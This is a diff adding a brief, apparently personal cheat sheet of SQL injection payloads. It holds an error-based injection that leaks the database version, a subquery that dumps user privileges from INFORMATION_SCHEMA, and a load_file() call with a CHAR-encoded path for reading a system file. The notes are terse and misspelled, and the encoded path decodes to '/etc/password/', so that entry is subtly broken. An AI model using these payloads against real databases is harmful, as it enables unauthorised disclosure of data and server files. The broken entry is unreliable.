@@ -1,0 +1,17 @@
+path location
+
++OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1
+
+
+
+user su primssion
+
+(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)
+
+
+
+etc/password/ string 
+
+
+load_file(CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 111, 114, 100, 47))
+
